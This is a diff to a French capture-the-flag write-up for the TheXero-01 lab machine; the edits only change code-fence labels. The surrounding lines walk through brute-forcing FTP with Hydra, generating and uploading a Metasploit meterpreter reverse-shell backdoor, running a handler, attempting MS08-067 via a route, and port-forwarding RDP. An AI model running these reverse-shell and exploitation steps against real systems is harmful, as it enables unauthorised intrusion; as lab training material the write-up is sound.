@@ -96,7 +96,7 @@ Il y a aussi le titre de la page qui est "TheXero-01"
 
 On créé une petite wordlist rapide en se basant sur ces informations :  
 
-```plain
+```
 Bobby                                                                                                                                                                                                          
 b0bby                                                                                                                                                                                                          
 Matrix                                                                                                                                                                                                         
@@ -150,7 +150,7 @@ Hydra (http://www.thc.org/thc-hydra) finished at 2014-03-25 21:16:08
 
 Attention le serveur FTP gère très mal la surcharge et avec le nombre de threads par défaut de *Hydra* il retournait souvent une erreur 421.  
 
-```plain
+```
 > ftp 192.168.1.11
 Connected to 192.168.1.11.
 220 Microsoft FTP Service
@@ -206,19 +206,19 @@ Le dossier *AdminScripts* semble contenir des fichiers par défaut pour une inst
 
 Dans le fichier *hint.html* on trouve le texte suivant :
 
-```plain
+```
 #1 This very common Windows file is not downloaded or interpretered but rather executed server side
 ```
 
 Soit ! On génère une backdoor *Metasploit* (un reverse-shell meterpreter) que l'on uploade sur le FTP (attention à être en mode binaire) :  
 
-```plain
+```
 msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.3 LPORT=9999 X > /tmp/rbd.exe
 ```
 
 On met en place un handler d'écoute et on ouvre la page via le navigateur pour provoquer l'exécution :  
 
-```plain
+```
 msf > use exploit/multi/handler
 msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
 payload => windows/meterpreter/reverse_tcp
@@ -265,7 +265,7 @@ Malheureusement le process est arrêté au bout d'un moment car le serveur web o
 
 Il faut que l'on relance un process séparément, ce qui peut se faire directement depuis la session *meterpreter* si on est assez rapide :  
 
-```plain
+```
 meterpreter > execute -f rbd.exe
 Process 756 created.
 meterpreter > background
@@ -282,7 +282,7 @@ meterpreter >
 
 Bien maintenant la connexion tient bon mais on ne peut pas faire grand chose avec nos droits en cours :
 
-```plain
+```
 meterpreter > getprivs
 ============================================================
 Enabled Process Privileges
@@ -301,7 +301,7 @@ C'est du au faut que les droits dont on dispose sont ceux d'un *IUSR* (Internet 
 
 Voyons voir ce qu'il y a d'autre comme services sur cette machine :  
 
-```plain
+```
 meterpreter > netstat
 
 Connection list
@@ -334,7 +334,7 @@ Come get some
 
 Essayons de mettre en place une route depuis *Metasploit* afin de pouvoir lancer un exploit SMB sur la port 445 local :  
 
-```plain
+```
 msf exploit(handler) > route add 127.0.0.1 255.255.255.0 2
 [*] Route added
 msf exploit(handler) > connect 127.0.0.1 445
@@ -344,7 +344,7 @@ msf exploit(handler) > connect 127.0.0.1 445
 
 La redirection fonctionne :)  
 
-```plain
+```
 msf exploit(handler) > use exploit/windows/smb/ms08_067_netapi
 msf exploit(ms08_067_netapi) > set RHOST 127.0.0.1
 RHOST => 127.0.0.1
@@ -359,7 +359,7 @@ msf exploit(ms08_067_netapi) > exploit
 
 et si on fixe la target :  
 
-```plain
+```
 [*] Started reverse handler on 127.0.0.1:9999 via the meterpreter on session 2
 [-] Exploit failed: Rex::Proto::SMB::Exceptions::ErrorCode The server responded with error: STATUS_OBJECT_NAME_NOT_FOUND (Command=162 WordCount=0)
 ```
@@ -371,7 +371,7 @@ Kansas City Shuffle
 
 On va plutôt créer une redirection de port vers le service *TSE* (port 3389) et voir ce qu'on peut en faire :
 
-```plain
+```
 meterpreter > portfwd add -l 3389 -p 3389 -r 127.0.0.1
 [*] Local TCP relay created: 0.0.0.0:3389 <:-> 127.0.0.1:3389
 ```
@@ -382,7 +382,7 @@ On peut maintenant se connecter via *TSE* avec les même identifiants que pour l
 
 Sous *Metasploit*, on relance le handler et depuis la session *Windows* on lance *rbd.exe*.  
 
-```plain
+```
 msf exploit(handler) > exploit
 
 [*] Started reverse handler on 192.168.1.3:9999 
@@ -448,7 +448,7 @@ Si on obtient un shell et que l'on tente d'aller dans le dossier administrator, 
 
 C'est sans doute parce que l'on est dans un processus qui n'appartient pas à *SYSTEM*, on va donc déménager :
 
-```plain
+```
 meterpreter > ps
 
 Process List
